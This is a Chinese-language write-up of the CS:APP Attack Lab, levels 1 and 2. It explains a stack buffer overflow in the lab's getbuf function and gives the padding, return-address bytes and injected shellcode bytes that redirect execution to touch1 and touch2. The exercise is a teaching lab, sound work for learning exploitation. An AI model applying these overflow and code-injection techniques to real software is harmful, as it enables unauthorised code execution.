# Part I: Code Injection Attacks
由于Lab程序编译平台比较老，运行时会出现segment fault。可以自己链接一个printf函数来解决这个问题。详细见[Fix CS:APP Attack Lab Segmentation Fault on Newest Ubuntu 22.04](https://blog.rijuyuezhu.top/posts/db646f34/)  
运行时使用如下命令
```
$ LD_PRELOAD=./printf.so ./ctarget -q
```
或在GDB中使用
```
(gdb) set environment LD_PRELOAD=./printf.so
```

## Level 1
阅读`getbuf`函数反汇编代码可以发现调用时分配了`0x28`大小的栈空间，该空间包括了`BUFFER_SIZE`指定的空间大小和编译器预留的空间。再往上`0x8`字节即为返回地址。输入字符串覆盖该地址即可。
```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
```
查找`touch1`函数的地址为`0x4017c0`, 小端表示并扩展到`0x8`字节得到
```
c0 17 40 00 00 00 00 00
```
前面随便填充`0x28`字节的字符即可

## Level 2
使用gdb查看运行时栈地址, 注意到调用`getbuf`后栈地址维持`0x5561dca0`不变, 考虑直接写入指令进行攻击
注意此时栈指针`%rsp`经过经过一次`ret`后值为`0x5561dca8`, 顶部 8 bytes写入`touch2`地址进行`ret`
```
0x5561dca8 ec 17 40 00 00 00 00 00
```
继续往上8 bytes用于存储需要传入的`cookie`, 起始地址距栈顶`0x8`
```
0x5561dcb0 fa 97 b9 59 00 00 00 00
```
攻击执行的汇编指令如下
```
mov 0x8(%rsp),%rdi
ret
```
参考已有的反汇编代码可以写为16进制指令
```
mov 0x8(%rsp),%rdi  48 8b 7c 24 08
ret                 c3
```
指令共6 bytes. 反推从`getbuf`返回时的执行指令地址为`0x5561dca8 + 0x8 + 0x8 = 0x5561dcb8`
整理为写入后的栈帧
```
0x5561dcbd c3 
0x5561dcb8 48 8b 7c 24 08
0x5561dcb0 fa 97 b9 59 00 00 00 00
0x5561dca8 ec 17 40 00 00 00 00 00
0x5561dca0 b8 dc 61 55 00 00 00 00 
```